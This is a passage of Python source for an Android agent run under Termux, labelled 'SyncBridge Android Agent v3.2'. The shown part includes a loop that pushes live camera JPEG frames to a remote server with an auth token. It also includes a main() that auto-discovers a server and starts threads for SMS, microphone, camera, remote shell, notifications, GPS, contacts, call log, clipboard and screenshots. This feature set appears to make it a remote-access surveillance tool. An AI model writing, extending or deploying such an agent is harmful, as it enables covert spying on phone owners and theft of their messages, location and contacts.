                        f"cam={cam}  {target_fps} FPS")
                    streaming = True
                linger_until = time.time() + STREAM_LINGER

            elif streaming and time.time() < linger_until:
                pass   # keep going briefly after last viewer leaves

            elif streaming:
                log("[STREAM] no viewers — stopping")
                streaming = False
                time.sleep(4)
                continue

            if streaming:
                t0   = time.time()
                jpeg = _capture_jpeg(cam)
                if jpeg:
                    try:
                        r = requests.post(
                            f"{SERVER}/api/stream/{DEVICE_ID}/push",
                            headers={'X-Auth-Token': TOKEN,
                                     'Content-Type': 'image/jpeg'},
                            data=jpeg, timeout=10)
                        viewers = r.json().get('viewers', 0)
                        if viewers > 0:
                            linger_until = time.time() + STREAM_LINGER
                        elapsed = time.time() - t0
                        log(f"[STREAM] {len(jpeg)//1024}KB  "
                            f"{1/max(elapsed,0.01):.1f}fps  viewers={viewers}")
                    except Exception as e:
                        log(f"[STREAM] push: {e}", 'WARN')
                    sleep_t = max(0.0, (1.0 / target_fps) - (time.time() - t0))
                    if sleep_t > 0:
                        time.sleep(sleep_t)
                else:
                    log("[STREAM] no frame captured", 'WARN')
                    time.sleep(1)
            else:
                time.sleep(5)

        except Exception as e:
            log(f"[STREAM] {e}", 'WARN')
            streaming = False
            time.sleep(5)

# ─────────────────────────────────────────────────────────────────────────────
#  SIGNAL HANDLER
# ─────────────────────────────────────────────────────────────────────────────

def stop(*_):
    global running
    log("Stopping agent…")
    running = False
    sys.exit(0)

# ─────────────────────────────────────────────────────────────────────────────
#  MAIN  (always last — all functions guaranteed defined above)
# ─────────────────────────────────────────────────────────────────────────────

def main():
    global SERVER, TOKEN

    signal.signal(signal.SIGINT,  stop)
    signal.signal(signal.SIGTERM, stop)
    load_config()

    if not SERVER or args.discover:
        if SERVER:
            log(f"Server set ({SERVER}) — skipping discovery")
        else:
            log("No server — trying auto-discovery…")
            url, tok = discover_server_udp()
            if not url: url, tok = discover_server_mdns()
            if url:
                SERVER = url
                if tok and not TOKEN: TOKEN = tok
                log(f"Discovered: {SERVER}")
            else:
                log("Discovery failed.", 'ERROR')
                log("  Use: --server https://YOUR.ms --token YOUR-TOKEN", 'ERROR')
                sys.exit(1)

    if not SERVER:
        log("No server URL. Use --server <url>", 'ERROR')
        sys.exit(1)

    log("=" * 58)
    log("  SyncBridge Android Agent v3.2")
    log(f"  Server  : {SERVER}")
    log(f"  Device  : {NAME} ({DEVICE_ID})")
    log(f"  Poll    : {POLL}s")
    log(f"  API mode: "
        f"{'Termux:API (F-Droid) — FULL features' if TERMUX_API else 'No-API fallback — stats + shell only'}")
    if not TERMUX_API:
        log("  ⚠  SMS/Camera/GPS/Stream require F-Droid Termux:API")
    log("=" * 58)

    register()

    # All functions defined above — no forward-reference issues
    thread_defs = [
        ('heartbeat',     _heartbeat,     10),
        ('stats',         _stats,         15),
        ('clipboard',     _clipboard,     10),
        ('sms',           _sms,           15),
        ('camera',        _camera,        10),
        ('mic',           _mic,           10),
        ('shell',         _shell,         10),
        ('notifications', _notifications, 10),
        ('gps',           _gps,           20),
        ('contacts',      _contacts,      30),
        ('calllog',       _calllog,       15),
        ('screenshot',    _screenshot,    10),
        ('control',       _control,       10),
        ('stream',        _stream,        15),
    ]

    for tname, fn, delay in thread_defs:
        t = threading.Thread(
            target=supervised(tname, fn, delay),
            daemon=True, name=tname)
        t.start()
        log(f"  ✓ {tname}")

    log("All threads running.  Ctrl+C to stop.")
    while running:
        time.sleep(1)


if __name__ == '__main__':
    main()
